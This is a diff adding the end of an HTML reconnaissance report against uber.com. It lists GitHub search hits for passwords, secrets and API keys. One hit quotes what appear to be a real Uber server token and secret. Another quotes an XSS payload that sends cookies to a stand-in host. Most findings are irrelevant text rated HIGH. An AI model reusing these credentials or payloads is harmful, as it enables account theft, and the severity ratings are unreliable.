+                    <th>Finding</th>
+                    <th>Detail</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td class="sev-low">LOW</td><td>DNSSEC Not Enabled</td><td>Domain uber.com does not have DNSSEC enabled. This makes it vulnerable to DNS spoofing attacks.</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: CHANGELOG.md</td><td>Repo: uber/uber-ios-sdk | Query: &quot;uber.com&quot; password | Match: #### SSO (Native login with Uber) 
+Introducing **SSO**. Allows a user to sign in &amp; authorize your application via the native Uber app. Users no longer</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: Jump.md</td><td>Repo: ubahnverleih/WoBike | Query: &quot;uber.com&quot; password | Match: --data &quot;uberClientName=jump&quot; \
+    --data &quot;password=$PW&quot; \
+    --data &quot;x-csrf-token=$CSRF&quot; \     -b &quot;cookie.jar&quot; \
+    --url &quot;https://auth.uber.com/lo</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: README.md</td><td>Repo: clearbit/clearbit-ruby | Query: &quot;uber.com&quot; password | Match: ``` ruby
+company = Clearbit::Enrichment::Company.find(
+  domain: &#x27;uber.com&#x27;,
+  proxy: &#x27;https://user:password@proxyserver.tld:8080&#x27;
+)
+```</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: clay.asciidoc</td><td>Repo: uber/clay | Query: &quot;uber.com&quot; password | Match: ==============
+Jeremy Grosser &lt;jeremy@uber.com&gt;
+v2.1.5, 2014-01-30         &quot;username&quot;: &quot;myname&quot;,
+        &quot;password&quot;: &quot;superseekrit&quot;,
+        &quot;from&quot;: &quot;</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: Corpus/118516.txt</td><td>Repo: eyalmazuz/ThreatIntelligenceCorpus | Query: &quot;uber.com&quot; password | Match: Uber Pays Researcher $10K for Login Bypass Exploit
+Ridesharing company Uber recently patched a vulnerability in its site that could have allowed an at</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: go.md</td><td>Repo: hyunjun/bookmarks | Query: &quot;uber.com&quot; password | Match: * [macos-totp-cli: simple TOTP CLI, powered by keychain of macOS](https://github.com/simnalamburt/macos-totp-cli)
+  * macOS의 키체인을 이용해서 터미널에서 TOTP(Time</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: app.js</td><td>Repo: chriswhong/uber-trip-script | Query: &quot;uber.com&quot; password | Match: &#x27;email&#x27;: user,
+    &#x27;password&#x27;: pass,
+    &#x27;_csrf_token&#x27;: csrf,     &#x27;redirect_to&#x27;: &#x27;riders&#x27;,
+    &#x27;redirect_url&#x27;: &#x27;https://riders.uber.com/trips&#x27;,
+    &#x27;r</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: readme.md</td><td>Repo: andrew--r/frontend-case-studies | Query: &quot;uber.com&quot; password | Match: - [Best Practices for Unit Testing in React Version 16](https://eng.uber.com/best-practices-for-react-v16/) (August 29, 2019)
+- [Counting Calories: Ho</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: README.org</td><td>Repo: lujun9972/emacs-document | Query: &quot;uber.com&quot; password | Match: + [[https://github.com/lujun9972/emacs-document/blob/master/org-mode/Org-mode实现的看板系统.org][Org-mode实现的看板系统.org]]		&lt;2016-09-07&gt;	 [[http://jr0cket.co.uk/</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: README.md</td><td>Repo: Viralmaniar/SMWYG-Show-Me-What-You-Got | Query: &quot;uber.com&quot; password | Match: Above image search the credentials for `uber.com` and have found 203 accounts. 
+ - Use differnt passwords for different accounts
+- Use password manage</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: README.rst</td><td>Repo: uber/rides-python-sdk | Query: &quot;uber.com&quot; secret | Match: )
+    auth_url = auth_flow.get_authorization_url()
+
+You can find `YOUR_CLIENT_ID` and `YOUR_CLIENT_SECRET` in the `developer dashboard &lt;https://develo</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: README.md</td><td>Repo: abhivaikar/howtheytest | Query: &quot;uber.com&quot; secret | Match: * [Using the Octopus Framework - Jeff Hu](https://www.youtube.com/watch?v=80wc8gWebrk&amp;ab_channel=Touchlab)
+* [Inside Uber&#x27;s secret self-driving car te</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: apache.md</td><td>Repo: hyunjun/bookmarks | Query: &quot;uber.com&quot; secret | Match: * Apache Storm, Apache Spark와 비교하여 Flink를 선택한 배경 설명
+* [Introduction of apache flink kosscon2018](https://www.slideshare.net/secret/dhQ4aYqD02SQ11)
+* [</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: README.md</td><td>Repo: uber/rides-java-sdk | Query: &quot;uber.com&quot; secret | Match: ### Installing
+
+#### Before you begin
+Register your app in the [Uber developer dashboard](https://developer.uber.com/dashboard). Notice that the app g</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: readme.md</td><td>Repo: realpython/list-of-python-api-wrappers | Query: &quot;uber.com&quot; secret | Match: - [API Documentation](https://onetimesecret.com/docs/api)
+- [Python wrapper for OneTimeSecret](https://github.com/utter-step/py_onetimesecret)
+ ### [U</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: link.txt</td><td>Repo: dongfeiwww/blitzscaling | Query: &quot;uber.com&quot; secret | Match: http://waitbutwhy.com/2015/11/the-cook-and-the-chef-musks-secret-sauce.html
+The Cook and the Chef: Musk&#x27;s Secret Sauce
+http://themodernteam.com/unlimi</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: brace.org</td><td>Repo: stxapps/brace-client | Query: &quot;uber.com&quot; secret | Match: - lyft colors
+- brand.uber.com/guide#color-specialty-colors
+- Action color: dark grey (close to black) - Need to provide a screenshot and description </td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: k8s.md</td><td>Repo: acim/awesome | Query: &quot;uber.com&quot; secret | Match: - [Keel - Kubernetes Operator to automate Helm, DaemonSet, StatefulSet &amp; Deployment updates](https://keel.sh)
+- [M3 - Uber’s large-scale metrics platf</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: PN_urls.txt</td><td>Repo: tech234a/annotation-urls | Query: &quot;uber.com&quot; secret | Match: http://shocksand.co.nf/twitter
+http://t.uber.com/1millionwomen
+http://153greatfish.website/ http://www.redbubble.com/people/wretchplays/works/15448904</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: keys.txt</td><td>Repo: yowmamasita/uwian-na | Query: &quot;uber.com&quot; secret | Match: server token: Ub7LZW7L9pnjLlogSC3Ylr8oNT1L9w10VWmRUDQE
+secret: HrnfE6GDjFlEf5RrbN7IpzM92afL5rQiu1h1o5hC
+ 
+sandbox url: https://sandbox-api.uber.com/</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: README.md</td><td>Repo: projectdiscovery/chaos-client | Query: &quot;uber.com&quot; api_key | Match: You can get your API key by either signing up or logging in at [cloud.projectdiscovery.io](https://cloud.projectdiscovery.io?ref=api_key).
+ ```bash
+ch</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: Jump.md</td><td>Repo: ubahnverleih/WoBike | Query: &quot;uber.com&quot; api_key | Match: This is what we do first.
+Open the `AndroidManifest.xml` in `base.complete/` folder and search for the `com.google.android.geo.API_KEY` string.
+Replac</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: tops_by_bug_type/TOPIDOR.md</td><td>Repo: reddelexc/hackerone-reports | Query: &quot;uber.com&quot; api_key | Match: 152. [&#x27;cnvID&#x27; parameter vulnerable to Insecure Direct Object References](https://hackerone.com/reports/265284) to Concrete CMS - 20 upvotes, $0
+153. [</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: lib/Uber.js</td><td>Repo: shernshiou/node-uber | Query: &quot;uber.com&quot; api_key | Match: access_token_url: &#x27;https://login.uber.com/oauth/v2/token&#x27;,
+    revoke_token_url: &#x27;https://login.uber.com/oauth/v2/revoke&#x27;,
+    proxy: options.proxy   </td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: Demo/Common/ViewController.swift</td><td>Repo: OAuthSwift/OAuthSwift | Query: &quot;uber.com&quot; api_key | Match: &quot;method&quot;         : &quot;flickr.photos.search&quot;,
+            &quot;api_key&quot;        : consumerKey,
+            &quot;user_id&quot;        : &quot;128483205@N08&quot;,             con</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: screen/js/config.js</td><td>Repo: lanewinfield/porter | Query: &quot;uber.com&quot; api_key | Match: Grab this at https://developer.uber.com/
+ 
+var uberAPIKey = &quot;UBER_API_KEY_HERE&quot;;
+var uberXProductID = &quot;UBER_X_PRODUCT_ID_HERE&quot;;</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: bg.js</td><td>Repo: chromakode/picnic | Query: &quot;uber.com&quot; api_key | Match: ].join(&#x27;,&#x27;)
+      fetch(`https://maps.googleapis.com/maps/api/geocode/json?key=${GOOGLE_API_KEY}&amp;latlng=${latlng}`)
+        .then(resp =&gt; resp.json())</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: README.md</td><td>Repo: chvancooten/BugBountyScanner | Query: &quot;uber.com&quot; api_key | Match: Note: &#x27;ToolsDir&#x27;, &#x27;telegram_api_key&#x27; and &#x27;telegram_chat_id&#x27; can be defined in .env or through Docker environment variables.
+  example:
+./BugBountyScan</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: API/Uber.py</td><td>Repo: Fortr4n/LAM | Query: &quot;uber.com&quot; api_key | Match: class UberAPI:
+    def __init__(self, api_key):
+        self.api_key = api_key
+        self.base_url = &quot;https://api.uber.com/v1.2&quot;
+
+    def get_ride_e</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: index.php</td><td>Repo: caseysoftware/uber-project | Query: &quot;uber.com&quot; api_key | Match: $params[&#x27;end_latitude&#x27;] = $end_lat;
+    $params[&#x27;end_longitude&#x27;] = $end_lon;
+    $options = [];
+    $options[&#x27;headers&#x27;] = [&#x27;Authorization&#x27; =&gt; &#x27;Bearer </td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: src/frontend/src/pages/ApiKeysPage.tsx</td><td>Repo: caffeinepub/dreamcrafter | Query: &quot;uber.com&quot; apikey | Match: import { AnimatePresence, motion } from &quot;motion/react&quot;;
+import { useCallback, useEffect, useRef, useState } from &quot;react&quot;;
+
+interface ApiKey {
+  id: st</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: README.md</td><td>Repo: public-apis/public-apis | Query: &quot;uber.com&quot; apikey | Match: | [CryptoCompare](https://www.cryptocompare.com/api#) | Cryptocurrencies Comparison | No | Yes | Unknown |
+| [CryptoMarket](https://api.exchange.crypt</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: docs/Usage.md</td><td>Repo: OWASP/Nettacker | Query: &quot;uber.com&quot; apikey | Match: - Using Whatcms Scan: API key can be found [here](https://whatcms.org/APIKey)
+ ```
+python nettacker.py -i eng.uber.com -m whatcms_scan --method-args w</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: filters/privacy.txt</td><td>Repo: uBlockOrigin/uAssets | Query: &quot;uber.com&quot; apikey | Match: ! https://github.com/uBlockOrigin/uAssets/issues/22493
+/^https:\/\/mudah\.my\/[a-zA-Z0-9]{16}\/[a-zA-Z0-9]{16}\?apiKey=/$script,1p,domain=mudah.my
+ ! </td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: lib/Uber.js</td><td>Repo: shernshiou/node-uber | Query: &quot;uber.com&quot; apikey | Match: access_token_url: &#x27;https://login.uber.com/oauth/v2/token&#x27;,
+    revoke_token_url: &#x27;https://login.uber.com/oauth/v2/revoke&#x27;,
+    proxy: options.proxy   </td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: SpywareFilter/sections/specific.txt</td><td>Repo: AdguardTeam/AdguardFilters | Query: &quot;uber.com&quot; apikey | Match: ||uber.com/v2/_events
+||uber.com/go/_events
+hindustantimes.com#%#//scriptlet(&#x27;set-local-storage-item&#x27;, &#x27;/^_c(b|hartbeat)/&#x27;, &#x27;$remove$&#x27;) ||kroger.com/r</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: README.md</td><td>Repo: karanpratapsingh/system-design | Query: &quot;uber.com&quot; apikey | Match: ```tsx
+deleteURL(apiKey: string, shortURL: string): boolean
+``` 
+Let&#x27;s design an [Uber](https://uber.com) like ride-hailing service, similar to servic</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: skills/tangweigang-jpg/dora/knowledge/api_catalog/transportation.yaml</td><td>Repo: openclaw/skills | Query: &quot;uber.com&quot; apikey | Match: - &#x27;Tripadvisor (https://developer-tripadvisor.com/home/) — Rating 内容 用于 hotel, restaurant,
+  attraction 或 destination | 免费: 是（已包含在 public-apis 的 free/</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: BugBounty/awesome-oneliner-bugbounty.md</td><td>Repo: insightglacier/Dictionary-Of-Pentesting | Query: &quot;uber.com&quot; apikey | Match: ```bash
+curl &quot;https://recon.dev/api/search?key=apikey&amp;domain=example.com&quot; |jq -r &#x27;.[].rawDomains[]&#x27; | sed &#x27;s/ //g&#x27; | sort -u |httpx -silent
+``` ```bas</td></tr>
+<tr><td class="sev-medium">MEDIUM</td><td>GitHub Exposure: GLOBAL_PUBLIC_APIS_KR.md</td><td>Repo: yybmion/public-apis-4Kr | Query: &quot;uber.com&quot; apikey | Match: |                    [Pocket](https://getpocket.com/developer/)                     | 북마크 서비스                                            | `OAuth`  | </td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: lib/ruberto/authenticator.rb</td><td>Repo: unagisoftware/ruberto | Query: &quot;uber.com&quot; access_token | Match: SCOPE = &quot;eats.deliveries&quot;
+
+    class &lt;&lt; self
+      def access_token
+        @access_token = cached_token&amp;.fetch(:token) || fetch_new_token
+
+        @a</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: XSS Injection/README.md</td><td>Repo: swisskyrepo/PayloadsAllTheThings | Query: &quot;uber.com&quot; access_token | Match: &lt;script&gt;new Image().src=&quot;http://localhost/cookie.php?c=&quot;+document.cookie;&lt;/script&gt;
+&lt;script&gt;new Image().src=&quot;http://localhost/cookie.php?c=&quot;+localStora</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: apps/native-component-list/src/screens/AuthSession/AuthSessionScreen.tsx</td><td>Repo: expo/expo | Query: &quot;uber.com&quot; access_token | Match: authorizationEndpoint: &#x27;https://github.com/login/oauth/authorize&#x27;,
+      tokenEndpoint: &#x27;https://github.com/login/oauth/access_token&#x27;,
+      revocatio</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: social_core/backends/uber.py</td><td>Repo: python-social-auth/social-core | Query: &quot;uber.com&quot; access_token | Match: name = &quot;uber&quot;
+    ID_KEY = &quot;uuid&quot;
+    SCOPE_SEPARATOR = &quot; &quot;
+    AUTHORIZATION_URL = &quot;https://login.uber.com/oauth/authorize&quot;
+    ACCESS_TOKEN_URL = &quot;h</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: lib/Uber.js</td><td>Repo: shernshiou/node-uber | Query: &quot;uber.com&quot; access_token | Match: ? options.language
+      : &#x27;en_US&#x27;,
+    authorize_url: &#x27;https://login.uber.com/oauth/v2/authorize&#x27;,
+    access_token_url: &#x27;https://login.uber.com/oaut</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: samples/login-with-auth-code-demo/src/main/java/com/uber/sdk/android/samples/DemoActivity.java</td><td>Repo: uber/rides-android-sdk | Query: &quot;uber.com&quot; access_token | Match: public static final String CLIENT_ID = BuildConfig.CLIENT_ID;
+    public static final String REDIRECT_URI = BuildConfig.REDIRECT_URI;
+
+    public stat</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: providers/uber/conf.json</td><td>Repo: oauth-io/oauthd | Query: &quot;uber.com&quot; access_token | Match: &quot;url&quot;: &quot;https://login.uber.com/oauth&quot;,
+	&quot;oauth2&quot;: {
+		&quot;authorize&quot;: &quot;/authorize&quot;,
+		&quot;access_token&quot;: &quot;/token&quot;,
+		&quot;request&quot;: {
+			&quot;url&quot;: &quot;https://api.ube</td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: UberKit/UberKit.m</td><td>Repo: sachinkesiraju/UberKit | Query: &quot;uber.com&quot; access_token | Match: {
+    //GET /v1.2/history
+    
+    NSString *url = [NSString stringWithFormat:@&quot;https://api.uber.com/v1.2/history?access_token=%@&quot;, _accessToken];
+   </td></tr>
+<tr><td class="sev-high">HIGH</td><td>GitHub Exposure: backend/capture_access_token.py</td><td>Repo: Microsoftened-Nair/Cabsync | Query: &quot;uber.com&quot; access_token | Match: with open(&#x27;uber_access_token.txt&#x27;, &#x27;w&#x27;) as f:
+                    f.write(access_token)
+        print(f&quot;{&#x27;=&#x27;*60}\n&quot;)     # Check if the response is fr</td></tr>
+
+            </tbody>
+        </table>
+    </div>
+
+    <!-- ═══════════════ FOOTER ═══════════════ -->
+    <div class="footer">
+        <p>
+            Generated by <strong>DIGI TEAM v2.0.0</strong>
+            - Elite Reconnaissance Framework
+        </p>
+        <p style="margin-top: .25rem;">
+            Report generated: 2026-04-13T19:23:34.601004
+            | Target: uber.com
+            | Duration: 296.88s
+        </p>
+    </div>
+
+</div>
+</body>
+</html>
